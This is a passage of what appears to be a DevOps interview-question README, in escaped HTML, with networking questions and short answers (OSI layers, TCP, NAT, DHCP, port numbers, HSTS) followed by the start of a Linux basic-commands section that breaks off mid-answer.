&#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain the OSI model. What layers there are? What each layer is responsible for?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Application: user end (HTTP is here)&lt;/li&gt; &#xA;   &lt;li&gt;Presentation: establishes context between application-layer entities (Encryption is here)&lt;/li&gt; &#xA;   &lt;li&gt;Session: establishes, manages and terminates the connections&lt;/li&gt; &#xA;   &lt;li&gt;Transport: transfers variable-length data sequences from a source to a destination host (TCP &amp;amp; UDP are here)&lt;/li&gt; &#xA;   &lt;li&gt;Network: transfers datagrams from one network to another (IP is here)&lt;/li&gt; &#xA;   &lt;li&gt;Data link: provides a link between two directly connected nodes (MAC is here)&lt;/li&gt; &#xA;   &lt;li&gt;Physical: the electrical and physical spec the data connection (Bits are here)&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;You can read more about the OSI model in &lt;a href=&#34;http://www.penguintutor.com/linux/basic-network-reference&#34;&gt;penguintutor.com&lt;/a&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;For each of the following determine to which OSI layer it belongs: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Error correction&lt;/li&gt; &#xA;   &lt;li&gt;Packets routing&lt;/li&gt; &#xA;   &lt;li&gt;Cables and electrical signals&lt;/li&gt; &#xA;   &lt;li&gt;MAC address&lt;/li&gt; &#xA;   &lt;li&gt;IP address&lt;/li&gt; &#xA;   &lt;li&gt;Terminate connections&lt;/li&gt; &#xA;   &lt;li&gt;3 way handshake&lt;/li&gt;&#xA;  &lt;/ul&gt;&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;li&gt;Error correction - Data link&lt;/li&gt; &lt;li&gt;Packets routing - Network&lt;/li&gt; &lt;li&gt;Cables and electrical signals - Physical&lt;/li&gt; &lt;li&gt;MAC address - Data link&lt;/li&gt; &lt;li&gt;IP address - Network&lt;/li&gt; &lt;li&gt;Terminate connections - Session&lt;/li&gt; &lt;/b&gt;&#xA; &lt;li&gt;&lt;b&gt;3 way handshake - Transport &lt;/b&gt;&lt;/li&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What delivery schemes are you familiar with?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;Unitcast: One to one communication where there is one sender and one receiver.&lt;/p&gt; &lt;p&gt;Broadcast: Sending a message to everyone in the network. The address ff:ff:ff:ff:ff:ff is used for broadcasting. Two common protocols which use broadcast are ARP and DHCP.&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Multicast: Sending a message to a group of subscribers. It can be one-to-many or many-to-many. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is CSMA/CD? Is it used in modern ethernet networks?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;CSMA/CD stands for Carrier Sense Multiple Access / Collision Detection. Its primarily focus it to manage access to shared medium/bus where only one host can transmit at a given point of time.&lt;/p&gt; &lt;p&gt;CSMA/CD algorithm:&lt;/p&gt; &lt;/b&gt;&#xA; &lt;ol&gt;&#xA;  &lt;b&gt; &lt;li&gt;Before sending a frame, it checks whether another host already transmitting a frame.&lt;/li&gt; &lt;li&gt;If no one transmitting, it starts transmitting the frame.&lt;/li&gt; &lt;li&gt;If two hosts transmitted at the same time, we have a collision.&lt;/li&gt; &lt;li&gt;Both hosts stop sending the frame and they send to everyone a &#39;jam signal&#39; notifying everyone that a collision occurred&lt;/li&gt; &lt;li&gt;They are waiting for a random time before sending again&lt;/li&gt; &lt;li&gt;Once each host waited for a random time, they try to send the frame again and so the &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ol&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Describe the following network devices and the difference between them: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;router&lt;/li&gt; &#xA;   &lt;li&gt;switch&lt;/li&gt; &#xA;   &lt;li&gt;hub&lt;/li&gt;&#xA;  &lt;/ul&gt;&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How does a router works?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;A router is a physical or virtual appliance that passes information between two or more packet-switched computer networks. A router inspects a given data packet&#39;s destination Internet Protocol address (IP address), calculates the best way for it to reach its destination and then forwards it accordingly.&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is NAT?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;Network Address Translation (NAT) is a process in which one or more local IP address is translated into one or more Global IP address and vice versa in order to provide Internet access to the local hosts.&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is a proxy? How does it works? What do we need it for?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;A proxy server acts as a gateway between you and the internet. It’s an intermediary server separating end users from the websites they browse.&lt;/p&gt; &lt;p&gt;If you’re using a proxy server, internet traffic flows through the proxy server on its way to the address you requested. The request then comes back through that same proxy server (there are exceptions to this rule), and then the proxy server forwards the data received from the website to you.&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;roxy servers provide varying levels of functionality, security, and privacy depending on your use case, needs, or company policy. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is TCP? How does it works? What is the 3 way handshake?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;TCP 3-way handshake or three-way handshake is a process which is used in a TCP/IP network to make a connection between server and client.&lt;/p&gt; &lt;p&gt;A three-way handshake is primarily used to create a TCP socket connection. It works when:&lt;/p&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;A client node sends a SYN data packet over an IP network to a server on the same or an external network. The objective of this packet is to ask/infer if the server is open for new connections.&lt;/li&gt; &lt;li&gt;The target server must have open ports that can accept and initiate new connections. When the server receives the SYN packet from the client node, it responds and returns a confirmation receipt – the ACK packet or SYN/ACK packet.&lt;/li&gt; &lt;li&gt;The client node receives the SYN/ACK from the server and responds with an ACK packet. &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is round-trip delay or round-trip time?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;From &lt;a href=&#34;https://en.wikipedia.org/wiki/Round-trip_delay&#34;&gt;wikipedia&lt;/a&gt;: &#34;the length of time it takes for a signal to be sent plus the length of time it takes for an acknowledgement of that signal to be received&#34;&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Bonus question: what is the RTT of LAN? &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How does SSL handshake work?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the difference between TCP and UDP?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;TCP establishes a connection between the client and the server to guarantee the order of the packages, on the other hand, UDP does not establish a connection between client and server and doesn&#39;t handle package order. This makes UDP more lightweight than TCP and a perfect candidate for services like streaming.&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;a href=&#34;http://www.penguintutor.com/linux/basic-network-reference&#34;&gt;Penguintutor.com&lt;/a&gt; provides a good explanation. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What TCP/IP protocols are you familiar with?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain &#34;default gateway&#34;&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;A default gateway serves as an access point or IP router that a networked computer uses to send information to a computer in another network or the internet. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is ARP? How does it works?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;ARP stands for Address Resolution Protocol. When you try to ping an IP address on your local network, say 192.168.1.1, your system has to turn the IP address 192.168.1.1 into a MAC address. This involves using ARP to resolve the address, hence its name.&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Systems keep an ARP look-up table where they store information about what IP addresses are associated with what MAC addresses. When trying to send a packet to an IP address, the system will first consult this table to see if it already knows the MAC address. If there is a value cached, ARP is not used. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is TTL? What does it helps to prevent?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is DHCP? How does it works?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;It stands for Dynamic Host Configuration Protocol, and allocates IP addresses, subnet masks and gateways to hosts. This is how it works:&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;A host upon entering a network, broadcasts a message in search of a DHCP server (DHCP DISCOVER)&lt;/li&gt; &#xA;   &lt;li&gt;An offer message is sent back by the DHCP server as a packet containing lease time, subnet mask, IP addresses, etc (DHCP OFFER)&lt;/li&gt; &#xA;   &lt;li&gt;Depending on which offer accepted, the client sends back a reply broadcast letting all DHCP servers know (DHCP REQUEST)&lt;/li&gt; &#xA;   &lt;li&gt;Server sends an acknowledgment (DHCP ACK)&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Read more &lt;a href=&#34;https://linuxjourney.com/lesson/dhcp-overview&#34;&gt;here&lt;/a&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Can you have two DHCP servers in the same network? How it works?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is SSL tunneling? How does it works?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is a socket? Where can you see the list of sockets in your system?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is IPv6? Why should we consider using it if we have IPv4?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is VLAN?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is MTU?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What happens if you send a packet that is bigger than the MTU?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;True or False?. Ping is using UDP because it doesn&#39;t care about reliable connection&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is SDN?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is ICMP? What is it used for?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is NAT? How does it work?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;NAT stands for network address translation. It’s a way to map multiple local private addresses to a public one before transferring the information. Organizations that want multiple devices to employ a single IP address use NAT, as do most home routers. For example, your computer&#39;s private IP could be 192.168.1.100, but your router maps the traffic to it&#39;s public IP (e.g. 1.1.1.1). Any device on the internet would see the traffic coming from your public IP (1.1.1.1) instead of your private IP (192.168.1.100). &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Which factors affect network performances&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Which port number is used in each of the following protocols?: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;SSH&lt;/li&gt; &#xA;   &lt;li&gt;SMTP&lt;/li&gt; &#xA;   &lt;li&gt;HTTP&lt;/li&gt; &#xA;   &lt;li&gt;DNS&lt;/li&gt; &#xA;   &lt;li&gt;HTTPS&lt;/li&gt; &#xA;   &lt;li&gt;FTP&lt;/li&gt; &#xA;   &lt;li&gt;SFTP&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;SSH - 22&lt;/li&gt; &lt;li&gt;SMTP - 25&lt;/li&gt; &lt;li&gt;HTTP - 80&lt;/li&gt; &lt;li&gt;DNS - 53&lt;/li&gt; &lt;li&gt;HTTPS - 443&lt;/li&gt; &lt;li&gt;FTP - 21&lt;/li&gt; &lt;li&gt;SFTP - 22 &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;h4&gt;Network - Data and Control planes&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What &#34;control plane&#34; refers to?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;The control plane is the part of the network that decides how to route and forward packets to a different location. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What &#34;data plane&#34; refers to?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;The data plane is the part of the network that actually forwards the data/packets. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What &#34;management plane&#34; refers to?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Refers to monitoring and management functions. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;To which plane (data, control, ...) is creating routing tables belongs to?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Control Plane. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain Spanning Tree Protocol (STP)&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is link aggregation? Why is it used?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is Asymmetric Routing? How do deal with it?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What overlay (tunnel) protocols are you familiar with?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is GRE? How does it works?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is VXLAN? How does it works?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is SNAT?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain OSPF&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is latency?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Latency is the time taken for an information to reach its destination from the source. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is bandwidth?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Bandwidth is the capacity of a communication channel to measure how much data the latter can handle over a specific time period. More bandwidth would imply more traffic handling and thus more data transfer. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is throughput?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Throughput refers to the measurement of the real amount of data transferred over a certain period of time across any transmission channel. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;When performing a search query, what is more important, latency or throughput? And how to assure that what managing global infrastructure?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Latency. To have a good latency, a search query should be forwarded to the closest datacenter. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;When uploading a video, what is more important, latency or throughput? And how to assure that?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Throughput. To have a good throughput, the upload stream should be routed to an underutilized link. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What other considerations (except latency and throughput) are there when forwarding requests?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Keep caches updated (which means the request could be forwarded not to the closest datacenter) &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain Spine &amp;amp; Leaf&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is Network Congestion? What can cause it?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What can you tell me about UDP packet format? What about TCP packet format? How is it different?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the exponential backoff algorithm? Where is it used?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Using Hamming code, what would be the code word for the following data word 100111010001101?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;00110011110100011101 &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Give examples of protocols found in the application layer&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Hypertext Transfer Protocol (HTTP) - used for the webpages on the internet&lt;/li&gt; &lt;li&gt;Simple Mail Transfer Protocol (SMTP) - email transmission&lt;/li&gt; &lt;li&gt;Telecommunications Network - (TELNET) - terminal emulation to allow client access to telnet server&lt;/li&gt; &lt;li&gt;File Transfer Protocol (FTP) - facilitates transfer of files between any two machines&lt;/li&gt; &lt;li&gt;Domain Name System (DNS) - domain name translation&lt;/li&gt; &lt;li&gt;Dynamic Host Configuration Protocol (DHCP) - allocates IP addresses, subnet masks and gateways to hosts&lt;/li&gt; &lt;li&gt;Simple Network Management Protocol (SNMP) - gathers data of devices on the network &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Give examples of protocols found in the network Layer&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Internet Protocol (IP) - assists in routing packets from one machine to another&lt;/li&gt; &lt;li&gt;Internet Control Message Protocol (ICMP) - lets one know what is going such as error messages and debugging information &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is HSTS?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; HTTP Strict Transport Security is a web server directive that informs user agents and web browsers how to handle its connection through a response header sent at the very beginning and back to the browser. This forces connections over HTTPS encryption, disregarding any script&#39;s call to load any resource in that domain over HTTP. &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Read more [here](&lt;a href=&#34;https://www.globalsign.com/en/blog/what-is-hsts-and-how-do-i-use-it#:~:text=HTTP%20Strict%20Transport%20Security%20(HSTS,and%20back%20to%20the%20browser.)&#34;&gt;https://www.globalsign.com/en/blog/what-is-hsts-and-how-do-i-use-it#:~:text=HTTP%20Strict%20Transport%20Security%20(HSTS,and%20back%20to%20the%20browser.)&lt;/a&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;h4&gt;Network - Misc&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the Internet? Is it the same as the World Wide Web?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;The internet refers to network of networks, transferring huge amounts of data around the globe.&lt;br&gt; The World Wide Web is an application running on millions of server, on top of the internet, accessed through what is know as the web browser &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the ISP?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;ISP (Internet Service Provider) is the local internet company provider. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Linux&lt;/h2&gt; &#xA;&lt;h4&gt;Linux Master Application&lt;/h4&gt; &#xA;&lt;p&gt;A completely free application for testing your knowledge on Linux&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://play.google.com/store/apps/details?id=com.codingshell.linuxmaster&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/images/linux_master.jpeg&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Linux Self Assessment&lt;/h3&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is your experience with Linux?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;Only you know :)&lt;/p&gt; &lt;p&gt;For example:&lt;/p&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Administration&lt;/li&gt; &lt;li&gt;Troubleshooting &amp;amp; Debugging&lt;/li&gt; &lt;li&gt;Storage&lt;/li&gt; &lt;li&gt;Networking&lt;/li&gt; &lt;li&gt;Development&lt;/li&gt; &lt;li&gt;Deployments &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain what each of the following commands does and give an example on how to use it: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;touch&lt;/li&gt; &#xA;   &lt;li&gt;ls&lt;/li&gt; &#xA;   &lt;li&gt;rm&lt;/li&gt; &#xA;   &lt;li&gt;cat&lt;/li&gt; &#xA;   &lt;li&gt;cp&lt;/li&gt; &#xA;   &lt;li&gt;mkdir&lt;/li&gt; &#xA;   &lt;li&gt;pwd&lt;/li&gt; &#xA;   &lt;li&gt;cd&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;touch - update file&#39;s timestamp. More commonly used for creating files&lt;/li&gt; &lt;li&gt;ls - listing files and directories&lt;/li&gt; &lt;li&gt;rm - remove files and directories&lt;/li&gt; &lt;li&gt;cat - create, view and concatenate files&lt;/li&gt; &lt;li&gt;cp - copy files and directories&lt;/li&gt; &lt;li&gt;mkdir - create directories&lt;/li&gt; &lt;li&gt;pwd - print current working directory (= at what path the user currently located)&lt;/li&gt; &lt;li&gt;cd - change directory &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What each of the following commands does? &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;cd /&lt;/li&gt; &#xA;   &lt;li&gt;cd ~&lt;/li&gt; &#xA;   &lt;li&gt;cd&lt;/li&gt; &#xA;   &lt;li&gt;cd ..&lt;/li&gt; &#xA;   &lt;li&gt;cd .&lt;/li&gt; &#xA;   &lt;li&gt;cd -&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;cd / -&amp;gt; change to the root directory&lt;/li&gt; &lt;li&gt;cd ~ -&amp;gt; change to your home directory&lt;/li&gt; &lt;li&gt;cd -&amp;gt; change to your home directory&lt;/li&gt; &lt;li&gt;cd .. -&amp;gt; change to the directory above your current i.e 